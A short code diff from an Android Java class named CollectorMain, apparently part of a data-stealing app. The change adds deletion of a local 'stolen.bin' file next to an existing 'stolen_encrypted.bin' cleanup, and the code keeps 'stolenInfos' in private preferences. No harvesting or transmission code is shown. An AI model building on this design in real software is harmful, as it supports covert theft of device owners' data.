@@ -56,6 +56,9 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		if(new File(getFilesDir(), "stolen_encrypted.bin").exists()){
 			new File(getFilesDir(), "stolen_encrypted.bin").delete();
 		}
+		if(new File(getFilesDir(), "stolen.bin").exists()){
+			new File(getFilesDir(), "stolen.bin").delete();
+		}
 		sb=stolenInfos=getSharedPreferences("majeste",MODE_PRIVATE);
 		running = true;
 		try {
